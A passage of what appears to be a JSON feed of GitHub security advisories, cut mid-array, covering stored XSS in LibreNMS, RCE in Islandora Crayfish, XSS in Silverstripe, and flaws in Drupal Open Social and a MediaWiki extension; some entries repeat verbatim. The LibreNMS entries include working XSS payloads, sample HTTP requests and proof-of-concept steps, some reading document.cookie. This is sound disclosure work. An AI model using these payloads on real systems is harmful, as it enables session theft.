            "content_html": "<h1 id=\"storedxss-librenms-miscsection\">StoredXSS-LibreNMS-MiscSection</h1>\n<p><strong>Description:</strong></p>\n<p>Stored XSS on the parameter: <code>ajax_form.php</code> -&gt; param: state</p>\n<p>Request:</p>\n<pre><code class=\"language-http\">POST /ajax_form.php HTTP/1.1\nHost: &lt;your_host&gt;\nX-Requested-With: XMLHttpRequest\nX-CSRF-TOKEN: &lt;your_XSRF_token&gt;\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: &lt;your_cookie&gt;\n\ntype=override-config&amp;device_id=1&amp;attrib=override_icmp_disable&amp;state=\"&gt;&lt;img%20src%20onerror=\"alert(1)\"&gt; \n</code></pre>\n<p>of Librenms version 24.10.1 (<a href=\"https://github.com/librenms/librenms\">https://github.com/librenms/librenms</a>) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.</p>\n<p>The vulnerability in the line:</p>\n<pre><code class=\"language-php\">$attrib_val = get_dev_attrib($device, $name);\n</code></pre>\n<p>within the <code>dynamic_override_config</code> function arises because the value of <code>$attrib_val is</code> retrieved from untrusted data without any sanitization or encoding (at <a href=\"https://github.com/librenms/librenms/blob/master/includes/html/functions.inc.php#L778\">Line 778</a>). </p>\n<p>When <code>dynamic_override_config</code> is called, the unescaped <code>$attrib_val</code> is injected directly into the HTML (at <a href=\"https://github.com/librenms/librenms/blob/master/includes/html/pages/device/edit/misc.inc.php\">misc.inc.php</a>).</p>\n<p><strong>Proof of Concept:</strong></p>\n<ol>\n<li>Add a new device through the LibreNMS interface.</li>\n<li>Edit the newly created device and select the Misc section.</li>\n<li>In any of the following fields: \"Override default ssh port\", \"Override default telnet port\", \"Override default http port\" or \"Unix agent port\", enter the payload: <code>\"&gt;&lt;img src onerror=\"alert(document.cookie)\"&gt;</code>.</li>\n<li>Save the changes.</li>\n<li>Observe that when the page loads, the XSS payload executes, triggering a popup that displays the current cookies.</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/097d17cb-7a6c-4924-add8-f867df643025\">\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/8213d55a-d87a-4a6e-94bf-092877398da5\"></p>\n<p><strong>Impact:</strong></p>\n<p>Execution of Malicious Code</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-c66p-64fj-jmc2\">https://github.com/librenms/librenms/security/advisories/GHSA-c66p-64fj-jmc2</a></li>\n<li><a href=\"https://github.com/librenms/librenms/pull/16722\">https://github.com/librenms/librenms/pull/16722</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/26258a2518dbfa55b213ec4b90ec16ed97efb597\">https://github.com/librenms/librenms/commit/26258a2518dbfa55b213ec4b90ec16ed97efb597</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23200\">https://nvd.nist.gov/vuln/detail/CVE-2025-23200</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c66p-64fj-jmc2\">https://github.com/advisories/GHSA-c66p-64fj-jmc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c66p-64fj-jmc2",
            "title": "[librenms/librenms] LibreNMS Misc Section Stored Cross-site Scripting vulnerability",
            "date_modified": "2025-01-17T15:52:30.000Z",
            "date_published": "2025-01-16T17:32:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c66p-64fj-jmc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"storedxss-librenms-ports\">StoredXSS-LibreNMS-Ports</h1>\n<p><strong>Description:</strong></p>\n<p>Stored XSS on the parameter:\n<code>/ajax_form.php</code> -&gt; param: descr</p>\n<p>Request:</p>\n<pre><code class=\"language-http\">POST /ajax_form.php HTTP/1.1\nHost: &lt;your_host&gt;\nX-Requested-With: XMLHttpRequest\nX-CSRF-TOKEN: &lt;your_XSRF_token&gt;\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: &lt;your_cookie&gt;\n\ntype=update-ifalias&amp;descr=%22%3E%3Cimg+src+onerror%3D%22alert(1)%22%3E&amp;ifName=lo&amp;port_id=1&amp;device_id=1\n</code></pre>\n<p>of Librenms version 24.10.1 (<a href=\"https://github.com/librenms/librenms\">https://github.com/librenms/librenms</a>) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.</p>\n<p><strong>Proof of Concept:</strong></p>\n<ol>\n<li>Add a new device through the LibreNMS interface.</li>\n<li>Edit the newly created device and select the \"ports\" section.</li>\n<li>In the \"Description\" field, enter the following payload: <code>\"&gt;&lt;img src onerror=\"alert(1)\"&gt;</code>.</li>\n<li>Save the changes.</li>\n<li>The XSS vulnerability is triggered when accessing the \"ports\" tab, and the payload is executed again when hovering over the modified value in the \"Port\" field.</li>\n</ol>\n<p>Payload:\n<img alt=\"payload\" src=\"https://github.com/user-attachments/assets/2f38b985-6684-403f-9d1f-e405f09a75bb\"></p>\n<p>Executes:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/b70a6e34-d52c-4113-b769-4e271e33de88\">\nThe script execution vulnerability in the description field, as shown in the image, occurs at <a href=\"https://github.com/librenms/librenms/blob/master/includes/html/functions.inc.php#L63\">Line 63 of functions.inc.php</a></p>\n<pre><code class=\"language-php\">$overlib_content = '&lt;div class=overlib&gt;&lt;span class=overlib-text&gt;' . $text . '&lt;/span&gt;&lt;br /&gt;';\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/97b85403-5b7e-4f43-932c-d33bd3c0f73f\"></p>\n<p><strong>Impact:</strong></p>\n<p>Execution of Malicious Code</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-27vf-3g4f-6jp7\">https://github.com/librenms/librenms/security/advisories/GHSA-27vf-3g4f-6jp7</a></li>\n<li><a href=\"https://github.com/librenms/librenms/pull/16721\">https://github.com/librenms/librenms/pull/16721</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/9d07d166b87634091dcf21c62b28f9b42a3118c4\">https://github.com/librenms/librenms/commit/9d07d166b87634091dcf21c62b28f9b42a3118c4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23199\">https://nvd.nist.gov/vuln/detail/CVE-2025-23199</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-27vf-3g4f-6jp7\">https://github.com/advisories/GHSA-27vf-3g4f-6jp7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-27vf-3g4f-6jp7",
            "title": "[librenms/librenms] LibreNMS Ports Stored Cross-site Scripting vulnerability",
            "date_modified": "2025-01-17T15:52:11.000Z",
            "date_published": "2025-01-16T17:32:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-27vf-3g4f-6jp7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Description:</strong></p>\n<p>XSS on the parameters (Replace $DEVICE_ID with your specific $DEVICE_ID value):<code>/device/$DEVICE_ID/edit</code> -&gt; param: display</p>\n<p>of Librenms versions 24.9.0, 24.10.0, and 24.10.1 (<a href=\"https://github.com/librenms/librenms\">https://github.com/librenms/librenms</a>) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.</p>\n<p><strong>Proof of Concept:</strong></p>\n<ol>\n<li><p>Add a new device through the LibreNMS interface.</p>\n</li>\n<li><p>Edit the newly created device by going to the \"Device Settings\" section.</p>\n</li>\n<li><p>In the \"Display Name\" field, enter the following payload: <code>\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>.\n<img alt=\"Screenshot from 2024-11-06 09-41-37\" src=\"https://github.com/user-attachments/assets/6b44e049-5748-4f70-a667-c681cacec9da\"></p>\n</li>\n<li><p>Save the changes.</p>\n</li>\n<li><p>The XSS payload triggers when accessing the \"/apps\" path (if an application was previously added).\n<img alt=\"Screenshot from 2024-11-06 09-42-05\" src=\"https://github.com/user-attachments/assets/4bd39e1e-6c60-4cc5-b922-8db7fc8094fc\"></p>\n</li>\n</ol>\n<p><strong>Additional PoC:</strong></p>\n<ol>\n<li><p>In the \"Display Name\" field, enter the following payload: <code>\"&gt;&lt;img src onerror=\"alert(1)\"&gt;</code>.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/addb1b00-23b1-4c26-8ac7-494cb24ebe8a\"></p>\n</li>\n<li><p>The XSS vulnerability is triggered when accessing the \"/ports\" path, and the payload executes when hovering over the modified value in the \"Port\" field.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/446e0d62-2016-4435-a1eb-fe85079498e4\"></p>\n</li>\n</ol>\n<ul>\n<li><p>on <code>/device/$DEVICE_ID/ports/arp</code> path:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/72a42b6d-bef0-46d4-a210-5d4888dd5c89\"></p>\n</li>\n<li><p>on <code>/device/$DEVICE_ID/logs</code> path:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/b1322946-7b84-4190-8f77-9854f5b5925c\"></p>\n</li>\n<li><p>on <code>/search/search=arp/</code> path:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/103297b0-5364-4d12-b519-d74777367a2a\"></p>\n</li>\n</ul>\n<p><strong>Impact:</strong></p>\n<p>Execution of Malicious Code</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-pm8j-3v64-92cq\">https://github.com/librenms/librenms/security/advisories/GHSA-pm8j-3v64-92cq</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/afe92dbf4321f107012690d476685603d1ccb013\">https://github.com/librenms/librenms/commit/afe92dbf4321f107012690d476685603d1ccb013</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23198\">https://nvd.nist.gov/vuln/detail/CVE-2025-23198</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pm8j-3v64-92cq\">https://github.com/advisories/GHSA-pm8j-3v64-92cq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pm8j-3v64-92cq",
            "title": "[librenms/librenms] LibreNMS Display Name Stored Cross-site Scripting vulnerability",
            "date_modified": "2025-01-17T15:52:22.000Z",
            "date_published": "2025-01-16T17:21:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pm8j-3v64-92cq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"storedxss-librenms-display-name-2\">StoredXSS-LibreNMS-Display Name 2</h1>\n<p><strong>Description:</strong></p>\n<p>XSS on the parameters (Replace $DEVICE_ID with your specific $DEVICE_ID value):<code>/device/$DEVICE_ID/edit</code> -&gt; param: display</p>\n<p>of Librenms versions 24.11.0 (<a href=\"https://github.com/librenms/librenms\">https://github.com/librenms/librenms</a>) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.</p>\n<p><strong>Proof of Concept:</strong></p>\n<ol>\n<li>Add a new device through the LibreNMS interface.</li>\n<li>Edit the newly created device by going to the \"Device Settings\" section.</li>\n<li>In the \"Display Name\" field, enter the following payload: <code>\"&gt;&lt;img src onerror=\"alert(document.cookie)\"&gt;</code>.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/b1664e15-eba8-4cdd-b730-fb18936f109c\"></li>\n<li>Save the changes.</li>\n<li>The XSS payload is triggered when navigating to the path /device/$DEVICE_ID/logs and hovering over a type containing a tag (such as Core 1 in the image).\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/df23cec8-94bb-4155-961b-52ea659654a2\"></li>\n</ol>\n<p><strong>Impact:</strong></p>\n<p>Execution of Malicious Code</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-2f4w-6mc7-4w78\">https://github.com/librenms/librenms/security/advisories/GHSA-2f4w-6mc7-4w78</a></li>\n<li><a href=\"https://github.com/librenms/librenms/pull/16886\">https://github.com/librenms/librenms/pull/16886</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/c63c912d86098bcefd52a28328482b94632eadf8\">https://github.com/librenms/librenms/commit/c63c912d86098bcefd52a28328482b94632eadf8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56144\">https://nvd.nist.gov/vuln/detail/CVE-2024-56144</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2f4w-6mc7-4w78\">https://github.com/advisories/GHSA-2f4w-6mc7-4w78</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2f4w-6mc7-4w78",
            "title": "[librenms/librenms] LibreNMS Display Name 2 Stored Cross-site Scripting vulnerability",
            "date_modified": "2025-01-17T15:52:00.000Z",
            "date_published": "2025-01-16T17:18:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2f4w-6mc7-4w78"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Remote code execution may be possible in web-accessible installations of Homarus in certain configurations.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>The issue has been patched in <code>islandora/crayfish:4.1.0</code></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>The exploit requires making a request against the Homarus's <code>/convert</code> endpoint; therefore, the ability to exploit is much reduced if the microservice is not directly accessible from the Internet, so: Prevent general access from the Internet from hitting Homarus.</p>\n<p>Configure auth in Crayfish to be more strongly required, such that requests with <code>Authorization</code> headers that do not validate are rejected before the problematic CLI interpolation occurs.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li>XBOW-024-071</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Islandora/Crayfish/security/advisories/GHSA-mm6v-68qp-f9fw\">https://github.com/Islandora/Crayfish/security/advisories/GHSA-mm6v-68qp-f9fw</a></li>\n<li><a href=\"https://github.com/Islandora/Crayfish/commit/64cb4cec688928798cc40e6f0a0e863d7f69fd89\">https://github.com/Islandora/Crayfish/commit/64cb4cec688928798cc40e6f0a0e863d7f69fd89</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mm6v-68qp-f9fw\">https://github.com/advisories/GHSA-mm6v-68qp-f9fw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mm6v-68qp-f9fw",
            "title": "[islandora/crayfish] Crayfish allows Remote Code Execution via Homarus Authorization header",
            "date_modified": "2025-01-15T22:04:21.000Z",
            "date_published": "2025-01-15T22:04:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mm6v-68qp-f9fw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<blockquote>\n<p>[!IMPORTANT]\nThis vulnerability only affects sites which are in the \"dev\" environment mode. If your production website is in \"dev\" mode, it has been misconfigured, and you should immediately swap it to \"live\" mode.\nSee <a href=\"https://docs.silverstripe.org/en/developer_guides/debugging/environment_types/\">https://docs.silverstripe.org/en/developer_guides/debugging/environment_types/</a> for more information.</p>\n</blockquote>\n<p>If a website has been set to the \"dev\" environment mode, a URL can be provided which includes an XSS payload which will be executed in the resulting error message.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.silverstripe.org/download/security-releases/ss-2024-002\">https://www.silverstripe.org/download/security-releases/ss-2024-002</a></li>\n</ul>\n<h2 id=\"reported-by\">Reported by</h2>\n<p>Gaurav Nayak from <a href=\"https://chaleit.com/\">Chaleit</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-mqf3-qpc3-g26q\">https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-mqf3-qpc3-g26q</a></li>\n<li><a href=\"https://github.com/silverstripe/silverstripe-framework/commit/a555dad4ec73c929f6316bcb4019eb325a5b77d8\">https://github.com/silverstripe/silverstripe-framework/commit/a555dad4ec73c929f6316bcb4019eb325a5b77d8</a></li>\n<li><a href=\"https://www.silverstripe.org/download/security-releases/ss-2024-002\">https://www.silverstripe.org/download/security-releases/ss-2024-002</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mqf3-qpc3-g26q\">https://github.com/advisories/GHSA-mqf3-qpc3-g26q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mqf3-qpc3-g26q",
            "title": "[silverstripe/framework] Silverstripe Framework has a Reflected Cross Site Scripting (XSS) in error message",
            "date_modified": "2025-01-14T22:57:19.000Z",
            "date_published": "2025-01-14T22:19:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mqf3-qpc3-g26q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In some cases, form messages can contain HTML markup. This is an intentional feature, allowing links and other relevant HTML markup for the given message.</p>\n<p>Some form messages include content that the user can provide. There are scenarios in the CMS where that content doesn't get correctly sanitised prior to being included in the form message, resulting in an XSS vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://www.silverstripe.org/download/security-releases/cve-2024-53277\">https://www.silverstripe.org/download/security-releases/cve-2024-53277</a></li>\n</ul>\n<h2 id=\"reported-by\">Reported by</h2>\n<p>Leo Diamat from <a href=\"http://www.bastionsecurity.co.nz/\">Bastion Security Group</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-ff6q-3c9c-6cf5\">https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-ff6q-3c9c-6cf5</a></li>\n<li><a href=\"https://github.com/silverstripe/silverstripe-framework/commit/74904f539347b7d1f8c5b5fb9e28d62ff251ee00\">https://github.com/silverstripe/silverstripe-framework/commit/74904f539347b7d1f8c5b5fb9e28d62ff251ee00</a></li>\n<li><a href=\"https://www.silverstripe.org/download/security-releases/cve-2024-53277\">https://www.silverstripe.org/download/security-releases/cve-2024-53277</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53277\">https://nvd.nist.gov/vuln/detail/CVE-2024-53277</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ff6q-3c9c-6cf5\">https://github.com/advisories/GHSA-ff6q-3c9c-6cf5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ff6q-3c9c-6cf5",
            "title": "[silverstripe/framework] Silverstripe Framework has a XSS in form messages",
            "date_modified": "2025-01-15T15:25:54.000Z",
            "date_published": "2025-01-14T22:18:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ff6q-3c9c-6cf5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using the \"insert media\" functionality, the linked oEmbed JSON includes an HTML attribute which will replace the embed shortcode. The HTML is not sanitized before replacing the shortcode, allowing a script payload to be executed on both the CMS and the front-end of the website.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.silverstripe.org/download/security-releases/cve-2024-47605\">https://www.silverstripe.org/download/security-releases/cve-2024-47605</a></li>\n</ul>\n<h2 id=\"reported-by\">Reported by</h2>\n<p>James Nicoll from <a href=\"https://www.fujitsu.com/nz/services/security/\">Fujitsu Cyber Security Services</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/silverstripe/silverstripe-asset-admin/security/advisories/GHSA-7cmp-cgg8-4c82\">https://github.com/silverstripe/silverstripe-asset-admin/security/advisories/GHSA-7cmp-cgg8-4c82</a></li>\n<li><a href=\"https://github.com/silverstripe/silverstripe-framework/commit/09b5052c86932f273e0d733428c9aade70ff2a4a\">https://github.com/silverstripe/silverstripe-framework/commit/09b5052c86932f273e0d733428c9aade70ff2a4a</a></li>\n<li><a href=\"https://www.silverstripe.org/download/security-releases/cve-2024-47605\">https://www.silverstripe.org/download/security-releases/cve-2024-47605</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47605\">https://nvd.nist.gov/vuln/detail/CVE-2024-47605</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cmp-cgg8-4c82\">https://github.com/advisories/GHSA-7cmp-cgg8-4c82</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cmp-cgg8-4c82",
            "title": "[silverstripe/framework] Silverstripe Framework has a XSS via insert media remote file oembed",
            "date_modified": "2025-01-15T15:25:45.000Z",
            "date_published": "2025-01-14T22:18:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cmp-cgg8-4c82"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The distribution didn't validate the flood control limits on the password reset form correctly resulting in a potential attacker flooding the password reset which could result in a Denial of Service. Fortunately the message does not disclose any information to the attacker.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-13274\">https://nvd.nist.gov/vuln/detail/CVE-2024-13274</a></li>\n<li><a href=\"https://www.drupal.org/sa-contrib-2024-038\">https://www.drupal.org/sa-contrib-2024-038</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-63wg-87qv-rw4r\">https://github.com/advisories/GHSA-63wg-87qv-rw4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-63wg-87qv-rw4r",
            "title": "[goalgorilla/open_social] Drupal Open Social allows Functionality Misuse",
            "date_modified": "2025-01-14T21:23:11.000Z",
            "date_published": "2025-01-09T21:31:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-63wg-87qv-rw4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The distribution didn't validate the flood control limits on the password reset form correctly resulting in a potential attacker flooding the password reset which could result in a Denial of Service. Fortunately the message does not disclose any information to the attacker.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-13274\">https://nvd.nist.gov/vuln/detail/CVE-2024-13274</a></li>\n<li><a href=\"https://www.drupal.org/sa-contrib-2024-038\">https://www.drupal.org/sa-contrib-2024-038</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-63wg-87qv-rw4r\">https://github.com/advisories/GHSA-63wg-87qv-rw4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-63wg-87qv-rw4r",
            "title": "[goalgorilla/open_social] Drupal Open Social allows Functionality Misuse",
            "date_modified": "2025-01-14T21:23:11.000Z",
            "date_published": "2025-01-09T21:31:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-63wg-87qv-rw4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The distribution didn't validate the flood control limits on the password reset form correctly resulting in a potential attacker flooding the password reset which could result in a Denial of Service. Fortunately the message does not disclose any information to the attacker.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-13274\">https://nvd.nist.gov/vuln/detail/CVE-2024-13274</a></li>\n<li><a href=\"https://www.drupal.org/sa-contrib-2024-038\">https://www.drupal.org/sa-contrib-2024-038</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-63wg-87qv-rw4r\">https://github.com/advisories/GHSA-63wg-87qv-rw4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-63wg-87qv-rw4r",
            "title": "[goalgorilla/open_social] Drupal Open Social allows Functionality Misuse",
            "date_modified": "2025-01-14T21:23:11.000Z",
            "date_published": "2025-01-09T21:31:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-63wg-87qv-rw4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-Site Request Forgery (CSRF), Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in Wikimedia Foundation Mediawiki - DataTransfer Extension allows Cross Site Request Forgery, Cross-Site Scripting (XSS).This issue affects Mediawiki - DataTransfer Extension: from 1.39.X before 1.39.11, from 1.41.X before 1.41.3, from 1.42.X before 1.42.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23081\">https://nvd.nist.gov/vuln/detail/CVE-2025-23081</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1080451\">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1080451</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1093931\">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1093931</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I5e1538a3bf66378810f905834c05626e1d2c82f0\">https://gerrit.wikimedia.org/r/q/I5e1538a3bf66378810f905834c05626e1d2c82f0</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I773c616db781d2f3f30893ad01ef503bf251a2b3\">https://gerrit.wikimedia.org/r/q/I773c616db781d2f3f30893ad01ef503bf251a2b3</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I7c9de4c8dcdb3276ba923c6bc7c8eef3531324c7\">https://gerrit.wikimedia.org/r/q/I7c9de4c8dcdb3276ba923c6bc7c8eef3531324c7</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I9223c31f02f31f1e06e1a8cddf7d539cc8d3a3d9\">https://gerrit.wikimedia.org/r/q/I9223c31f02f31f1e06e1a8cddf7d539cc8d3a3d9</a></li>\n<li><a href=\"https://phabricator.wikimedia.org/T379749\">https://phabricator.wikimedia.org/T379749</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3h5-h73c-29hq\">https://github.com/advisories/GHSA-c3h5-h73c-29hq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3h5-h73c-29hq",
            "title": "[mediawiki/data-transfer] Mediawiki - DataTransfer Extension Cross-Site Request Forgery (CSRF) and Cross-site Scripting (XSS)",
            "date_modified": "2025-01-14T20:07:52.000Z",
            "date_published": "2025-01-14T18:32:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3h5-h73c-29hq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-Site Request Forgery (CSRF), Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in Wikimedia Foundation Mediawiki - DataTransfer Extension allows Cross Site Request Forgery, Cross-Site Scripting (XSS).This issue affects Mediawiki - DataTransfer Extension: from 1.39.X before 1.39.11, from 1.41.X before 1.41.3, from 1.42.X before 1.42.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23081\">https://nvd.nist.gov/vuln/detail/CVE-2025-23081</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1080451\">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1080451</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1093931\">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/DataTransfer/+/1093931</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I5e1538a3bf66378810f905834c05626e1d2c82f0\">https://gerrit.wikimedia.org/r/q/I5e1538a3bf66378810f905834c05626e1d2c82f0</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I773c616db781d2f3f30893ad01ef503bf251a2b3\">https://gerrit.wikimedia.org/r/q/I773c616db781d2f3f30893ad01ef503bf251a2b3</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I7c9de4c8dcdb3276ba923c6bc7c8eef3531324c7\">https://gerrit.wikimedia.org/r/q/I7c9de4c8dcdb3276ba923c6bc7c8eef3531324c7</a></li>\n<li><a href=\"https://gerrit.wikimedia.org/r/q/I9223c31f02f31f1e06e1a8cddf7d539cc8d3a3d9\">https://gerrit.wikimedia.org/r/q/I9223c31f02f31f1e06e1a8cddf7d539cc8d3a3d9</a></li>\n<li><a href=\"https://phabricator.wikimedia.org/T379749\">https://phabricator.wikimedia.org/T379749</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3h5-h73c-29hq\">https://github.com/advisories/GHSA-c3h5-h73c-29hq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3h5-h73c-29hq",
            "title": "[mediawiki/data-transfer] Mediawiki - DataTransfer Extension Cross-Site Request Forgery (CSRF) and Cross-site Scripting (XSS)",
            "date_modified": "2025-01-14T20:07:52.000Z",
            "date_published": "2025-01-14T18:32:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3h5-h73c-29hq"
            },
            "tags": [
                "severity"
            ]
        },
        {
